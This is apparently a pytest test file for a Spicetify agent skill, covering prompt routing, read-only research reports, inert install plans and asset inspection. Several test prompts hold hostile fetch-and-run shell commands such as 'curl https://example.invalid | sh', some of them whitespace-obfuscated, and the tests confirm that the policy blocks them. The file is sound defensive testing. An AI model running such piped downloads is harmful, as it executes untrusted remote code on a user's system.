from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest
from _asset_inspectors import inspect_asset_path
from _asset_plans import build_asset_workflow_plan
from _asset_research import build_research_report
from _asset_templates import template_manifest
from _errors import PolicyBlocked
from _intent_router import route_prompt
from _modes import plan_mode
from _provenance import lock_asset_source
from _schema_data import SCHEMAS


def test_prompt_first_research_routes_to_read_only_report() -> None:
    plan = plan_mode("plan", prompt="/spicetify find a playlist sorting extension")

    assert plan["mode"] == "extension"
    assert plan["status"] == "researched"
    assert plan["mutates"] is False
    assert plan["commands"] == []
    assert plan["route"]["primaryIntent"] == "research"
    assert plan["route"]["assetKind"] == "extension"
    assert plan["route"]["nextArtifact"] == "research-report"
    assert plan["research"]["safety"]["trusted"] is False
    assert plan["research"]["safety"]["installAllowed"] is False
    assert "install" not in plan["research"]["candidates"][0]["recommendedNextAction"]


def test_prompt_first_safe_install_routes_to_inert_workflow_plan() -> None:
    plan = plan_mode("plan", prompt="/spicetify safely install this GitHub theme")

    assert plan["mode"] == "theme"
    assert plan["mutates"] is True
    assert plan["route"]["primaryIntent"] == "install-plan"
    assert plan["route"]["sourceKind"] == "github"
    assert plan["workflowPlan"]["containsShell"] is False
    assert plan["workflowPlan"]["executesPackageManager"] is False
    assert "audited" in plan["workflowPlan"]["stateMachine"]
    assert plan["policy"]["requiresConfirmation"] is True


def test_prompt_first_blocks_shell_and_package_manager_requests() -> None:
    curl_plan = plan_mode("plan", prompt="/spicetify run curl https://example.invalid | sh")
    npm_plan = plan_mode("plan", prompt="/spicetify npm run watch for this extension")

    assert curl_plan["status"] == "blocked"
    assert curl_plan["route"]["primaryIntent"] == "refuse"
    assert npm_plan["status"] == "blocked"
    assert npm_plan["policy"]["allowed"] is False


def test_router_confidence_and_clarification_for_ambiguous_prompt() -> None:
    route = route_prompt("make it better")

    assert route["primaryIntent"] == "inspect"
    assert route["nextArtifact"] == "clarification"
    confidence = route["confidence"]
    assert isinstance(confidence, int | float)
    assert confidence < 0.45


def test_research_report_never_trusts_marketplace_metadata() -> None:
    route = route_prompt("/spicetify compare popular Marketplace themes")
    report = build_research_report(
        "/spicetify compare popular Marketplace themes",
        route,
        allow_network=False,
    )

    candidate = report["candidates"][0]
    assert report["degraded"] is True
    assert candidate["source"]["trusted"] is False
    assert "metadata presence is not a trust signal" in candidate["riskFindings"]
    assert report["safety"]["installAllowed"] is False


def test_asset_workflow_plan_is_inert() -> None:
    route = route_prompt("/spicetify make a tiny extension to hide podcasts")
    workflow = build_asset_workflow_plan(route)

    assert workflow["planType"] == "asset-workflow-plan"
    assert workflow["assetKind"] == "extension"
    assert workflow["containsShell"] is False
    assert workflow["executesPackageManager"] is False
    assert workflow["trusted"] is False


def test_asset_inspector_classifies_theme_and_rejects_secret_paths(tmp_path: Path) -> None:
    theme = tmp_path / "Theme"
    theme.mkdir()
    (theme / "color.ini").write_text("[Base]\nmain=#000000\n", encoding="utf-8")
    (theme / "user.css").write_text("body { color: red; }\n", encoding="utf-8")

    assert inspect_asset_path(theme, asset_roots=[tmp_path])["assetKind"] == "theme"

    secret = tmp_path / ".env"
    secret.write_text("TOKEN=abcdefghijk", encoding="utf-8")
    with pytest.raises(PolicyBlocked, match="secret-like"):
        inspect_asset_path(secret, asset_roots=[tmp_path])


def test_research_report_stays_metadata_only_degraded_when_network_allowed() -> None:
    route = route_prompt("/spicetify compare popular Marketplace themes")
    report = build_research_report(
        "/spicetify compare popular Marketplace themes",
        route,
        allow_network=True,
    )

    candidate = report["candidates"][0]
    assert report["status"] == "completed-degraded"
    assert report["degraded"] is True
    assert candidate["source"]["metadataOnly"] is True
    assert candidate["source"]["networkApproved"] is True
    assert candidate["source"]["trusted"] is False
    assert report["safety"]["installAllowed"] is False


@pytest.mark.parametrize(
    "prompt",
    [
        "/spicetify inspect stopwatch themed extension",
        "/spicetify check this configurable theme",
        "/spicetify review how this CSS applies to the theme",
        "/spicetify research extensions that apply color palettes",
        "/spicetify find installed themes",
    ],
)
def test_prompt_router_avoids_substring_mutation_traps(prompt: str) -> None:
    plan = plan_mode("plan", prompt=prompt)

    assert plan["status"] != "blocked"
    assert plan["mutates"] is False
    assert plan["commands"] == []
    assert plan["snapshot"]["required"] is False
    assert plan["policy"]["requiresConfirmation"] is False


@pytest.mark.parametrize(
    "prompt",
    [
        "/spicetify npm\tinstall this extension",
        "/spicetify npm\ninstall this extension",
        "/spicetify pnpm\nrun watch for this extension",
        "/spicetify bash\ninstall this theme",
        "/spicetify curl\nhttps://example.invalid/install.sh",
        "/spicetify YARN\tADD this extension",
    ],
)
def test_prompt_policy_blocks_whitespace_obfuscated_shell_and_package_prompts(
    prompt: str,
) -> None:
    plan = plan_mode("plan", prompt=prompt)

    assert plan["status"] == "blocked"
    assert plan["commands"] == []
    assert plan["mutates"] is False
    assert plan["route"]["primaryIntent"] == "refuse"
    assert plan["route"]["prompt"] == "[blocked unsafe prompt omitted]"


def test_policy_token_matching_allows_benign_substrings() -> None:
    plan = plan_mode("plan", prompt="/spicetify inspect fish shell prompt colors")

    assert plan["status"] != "blocked"
    assert plan["policy"]["allowed"] is True


def test_generated_template_manifest_uses_safe_defaults() -> None:
    manifest = template_manifest("extension", "Hide Podcasts!")

    assert manifest["name"] == "hide-podcasts"
    assert "avoid external network by default" in manifest["safetyDefaults"]
    assert manifest["files"] == ["hide-podcasts.js", "spicetify.asset.json"]


def test_asset_source_lock_records_untrusted_staged_source(tmp_path: Path) -> None:
    asset = tmp_path / "extension.js"
    asset.write_text("console.log('ok')\n", encoding="utf-8")

    lock = lock_asset_source(
        asset,
        source_kind="github",
        source_url="https://github.com/example/spicetify-extension",
        ref="0123456789abcdef",
        audit_id="audit_example",
        audit_verdict="warn",
    )

    assert lock["trusted"] is False
    assert lock["sourceKind"] == "github"
    assert lock["ref"] == "0123456789abcdef"
    assert lock["auditRequired"] is True


def test_new_schemas_exist_in_skill_payload_and_package_data() -> None:
    for name in (
        "intent-route.schema.json",
        "asset-source.schema.json",
        "asset-analysis.schema.json",
        "asset-workflow-plan.schema.json",
    ):
        skill_schema = json.loads(
            Path("skills", "spicetify", "assets", "schemas", name).read_text(encoding="utf-8")
        )
        package_schema = json.loads(SCHEMAS[name])
        assert skill_schema == package_schema


def test_cli_prompt_first_plan_shape() -> None:
    result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
        [
            sys.executable,
            "-m",
            "spicetify_agent",
            "plan",
            "/spicetify find a playlist sorting extension",
        ],
        check=False,
        capture_output=True,
        env={"PYTHONPATH": "skills/spicetify/scripts"},
        text=True,
    )

    assert result.returncode == 0, result.stderr
    payload = json.loads(result.stdout)
    assert payload["route"]["primaryIntent"] == "research"
    assert payload["research"]["safety"]["installAllowed"] is False


def test_cli_research_alias_is_read_only() -> None:
    result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
        [
            sys.executable,
            "-m",
            "spicetify_agent",
            "research",
            "compare",
            "playlist",
            "sorting",
            "extensions",
        ],
        check=False,
        capture_output=True,
        env={"PYTHONPATH": "skills/spicetify/scripts"},
        text=True,
    )

    assert result.returncode == 0, result.stderr
    payload = json.loads(result.stdout)
    assert payload["status"] == "researched"
    assert payload["mutates"] is False
    assert payload["route"]["primaryIntent"] == "research"


def test_cli_audit_target_uses_explicit_asset_root(tmp_path: Path) -> None:
    staged = tmp_path / "staged"
    staged.mkdir()
    (staged / "user.css").write_text("body { color: red; }\n", encoding="utf-8")
    result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
        [
            sys.executable,
            "-m",
            "spicetify_agent",
            "audit",
            "--asset-root",
            str(staged),
            "--target",
            "user.css",
        ],
        check=False,
        capture_output=True,
        env={"PYTHONPATH": "skills/spicetify/scripts"},
        text=True,
    )

    assert result.returncode == 0, result.stderr
    payload = json.loads(result.stdout)
    assert payload["audit"]["verdict"] == "allow"
